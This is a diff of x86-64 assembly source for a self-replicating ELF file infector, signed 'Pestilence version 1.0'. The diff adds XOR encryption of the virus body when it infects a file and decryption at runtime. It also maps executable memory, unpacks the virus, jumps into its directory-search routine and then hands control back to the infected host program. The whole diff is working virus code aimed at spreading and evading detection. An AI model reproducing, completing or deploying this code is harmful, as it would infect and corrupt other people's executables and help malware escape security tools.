@@ -36,29 +36,6 @@ _start:
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
-;                      v dst       v len      v key       v key_size
-_xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
-	push r8
-	push r9
-
-	xor r8, r8; i len
-	.reset_key_size:
-		xor r9, r9; j key_size
-	.loop_bytes:
-		cmp r8, rsi
-		je .return
-		cmp r9, rcx
-		je .reset_key_size
-		mov al, byte[rdx + r9]; key[j]
-		xor byte[rdi + r8], al
-		inc r8
-		inc r9
-	jmp .loop_bytes
-	.return:
-
-	pop r9
-	pop r8
-ret
 
 _h3ll0w0rld:
 	pop r8; pop addr from stack
@@ -96,13 +73,36 @@ _h3ll0w0rld:
 		push 10
 		pop rax ; mprotect
 		syscall; change protect from file to _eof
-		pop rdx
 
-		lea rdi, [rel .virus]
+; = DEBUG
+;		mov rax, 60
+;		syscall
+; =
+		lea rdi, [rel _virus]
 		mov rdx, rdi
-		lea rsi, [rel _pack_start]
-		sub rdi, rsi
+		lea rsi, [rel _params]
+		sub rdx, rsi
+; = DEBUG
+;		mov rdi, rdx
+;		mov rax, 60
+;		syscall
+; =
+		mov rsi, [rel length]
+		sub rsi, rdx ; length - (_virus - _params)
+; = DEBUG
+;		mov rdi, rsi
+;		mov rax, 60
+;		syscall
+; =
+		lea rdx, [rel _h3ll0w0rld]
+		mov rcx, KEY_SIZE
 		; TODO: XOR DESENCRYPTION HERE
+		call _xor_encrypt
+		pop rdx
+; = DEBUG
+;		mov rax, 60
+;		syscall
+; =
 
 	jmp .infected; TODO: has to jmp on [eb 27] (previously $-15)
 	.here:
@@ -140,99 +140,131 @@ _h3ll0w0rld:
 		syscall
 
 		cmp rax, 0x0
-		jz .virus
+		jz _virus
 
-		jmp .prg
+		jmp _prg
+
 ; = DEBUG
-;		jmp .virus
+;		jmp _virus
 ; =
 		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
 			mov rax, 0x4e49474755424544
 			db `G..\n`, 0x0
-		.virus:
-			push rdx
-			push r8
-			; copy the virus into a mmap executable
-			xor rdi, rdi; NULL
 
-			lea rsi, [rel _eof]
-			lea r8, [rel _params]
-			sub rsi, r8
-			push 7
-			pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
-			push 34
-			pop r10; MAP_PRIVATE | MAP_ANON
-			push -1
-			pop r8 ; fd
-			xor r9, r9; offset
-			push SYSCALL_MMAP
-			pop rax; mmap
-			syscall
+;                      v dst       v len      v key       v key_size
+_xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
+	push r8
+	push r9
 
-			push rsi; save length
+	xor r8, r8; i len
+	.reset_key_size:
+		xor r9, r9; j key_size
+	.loop_bytes:
+		cmp r8, rsi
+		je .return
+		cmp r9, rcx
+		je .reset_key_size
+		mov al, byte[rdx + r9]; key[j]
+		xor byte[rdi + r8], al
+		inc r8
+		inc r9
+	jmp .loop_bytes
+	.return:
 
-	;		memcpy(void *dst, void *src, size_t len)
-			push rax
-			pop rdi ; addr
-			lea rsi, [rel _params]
-			lea rdx, [rel _pack_start]
-			sub rdx, rsi
-			call _ft_memcpy
-
-			mov r9, rdi; save addr
-	;		unpack(void *dst, void *src, size_t len)
-			add rdi, rdx
-			add rsi, rdx
-			mov rax, [rel length]
-			sub rax, rdx; length - [_pack_start - params]
-			push rax
-			pop rdx
-
-			call _unpack
-
-			push r9
-			pop rdi
-			pop rsi
-
-			pop r8
-
-			push rsi ; save length
-
-			lea rsi, [rel _params]
-			lea rax, [rel _search_dir]
-			sub rax, rsi
-			add rax, rdi
-
-			push rdi ; save addr
-
-			call rax ; jump to mmaped memory
-
-			pop rdi ; pop addr
-			pop rsi ; pop length
-
-			; munmap the previous exec
-			push SYSCALL_MUNMAP
-			pop rax
-			syscall
-			pop rdx
-
-			call _exit
-		.prg:
-			; end infected file
-			push r8
-			pop rax
-
-			sub rax, [rel entry_inject]
-			add rax, [rel entry_prg]
-
-			; jmp on entry_prg
-			jmp rax
+	pop r9
+	pop r8
+ret
 
 _exit:
 	push SYSCALL_EXIT
 	pop rax ; exit
 	xor rdi, rdi; = 0
 	syscall
+
+_virus:
+	push rdx
+	push r8
+	; copy the virus into a mmap executable
+	xor rdi, rdi; NULL
+
+	lea rsi, [rel _eof]
+	lea r8, [rel _params]
+	sub rsi, r8
+	push 7
+	pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
+	push 34
+	pop r10; MAP_PRIVATE | MAP_ANON
+	push -1
+	pop r8 ; fd
+	xor r9, r9; offset
+	push SYSCALL_MMAP
+	pop rax; mmap
+	syscall
+
+	push rsi; save length
+
+;		memcpy(void *dst, void *src, size_t len)
+	push rax
+	pop rdi ; addr
+	lea rsi, [rel _params]
+	lea rdx, [rel _pack_start]
+	sub rdx, rsi
+	call _ft_memcpy
+
+	mov r9, rdi; save addr
+;		unpack(void *dst, void *src, size_t len)
+	add rdi, rdx
+	add rsi, rdx
+	mov rax, [rel length]
+	sub rax, rdx; length - [_pack_start - params]
+	push rax
+	pop rdx
+
+	call _unpack
+
+	push r9
+	pop rdi
+	pop rsi
+
+	pop r8
+
+	push rsi ; save length
+
+	lea rsi, [rel _params]
+	lea rax, [rel _search_dir]
+	sub rax, rsi
+	add rax, rdi
+
+	push rdi ; save addr
+
+	call rax ; jump to mmaped memory
+
+	pop rdi ; pop addr
+	pop rsi ; pop length
+
+	; munmap the previous exec
+	push SYSCALL_MUNMAP
+	pop rax
+	syscall
+	pop rdx
+
+; = DEBUG
+;	mov rax, 60
+;	syscall
+; =
+
+	call _exit
+
+_prg:
+	; end infected file
+	push r8
+	pop rax
+
+	sub rax, [rel entry_inject]
+	add rax, [rel entry_prg]
+
+	; jmp on entry_prg
+	jmp rax
 
 ;                 v dst      v src       v size
 _unpack:; (void *rdi, void *rsi, size_t rdx)
@@ -654,8 +686,6 @@ _infect_file: ; (string rdi, stat rsi)
 			cmp rsi, rdx
 			jl .unmap ; not enough size /w packed virus
 
-			call _crypto
-
 			jmp .params
 
 			.infected:
@@ -671,11 +701,48 @@ _infect_file: ; (string rdi, stat rsi)
 			mov rax, rdi
 			add rdx, 8 * 3
 
-			call _crypto
-
 			.params:
-			; add _params
+; = DEBUG
+;	mov rax, 60
+;	syscall
+; =
 			sub rax, 8 * 3
+
+			push rdi
+			push rsi
+			push rcx
+			mov rdi, rax
+			push rax
+			lea rax, [rel _virus]
+			lea rcx, [rel _params]
+			sub rax, rcx
+			add rdi, rax
+;			lea rdi, [rel _virus]; => NON
+			lea rcx, [rel _virus]
+			lea rsi, [rel _params]
+			sub rcx, rsi
+			mov rsi, rdx; [rel length]
+			push rdx
+			sub rsi, rcx ; length - (_virus - _params)
+; = DEBUG
+;			mov rdi, rsi
+;			mov rax, 60
+;			syscall
+; =
+			lea rdx, [rel _h3ll0w0rld]
+			mov rcx, KEY_SIZE
+			call _xor_encrypt
+			pop rdx
+			pop rax
+			pop rcx
+			pop rsi
+			pop rdi
+; = DEBUG
+;	mov rax, 60
+;	syscall
+; =
+
+			; add _params
 			mov [rax], rdx ; length
 			add rax, 8
 			sub rdi, r13
@@ -736,10 +803,6 @@ _infect_file: ; (string rdi, stat rsi)
 	pop r12
 	pop r11
 	pop r10
-ret
-
-_crypto:
-	; TODO: XOR ENCRYPTION HERE <3
 ret
 
 _check_file_process:; (string rdi)
